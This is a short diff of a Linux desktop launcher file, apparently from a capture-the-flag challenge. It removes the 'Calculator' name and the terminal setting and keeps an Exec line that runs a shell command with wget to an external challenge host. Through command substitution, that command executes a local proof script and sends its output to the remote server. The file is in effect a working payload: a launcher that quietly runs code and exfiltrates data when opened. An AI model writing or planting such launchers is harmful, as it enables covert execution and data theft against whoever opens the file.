@@ -1,5 +1,3 @@
 [Desktop Entry]
-Name=Calculator
 Exec=sh -c "wget http://chal-s2.hkcert21.pwnable.hk:28098/server.py/?`/proof*.sh`"
 Type=Application
-Terminal=false
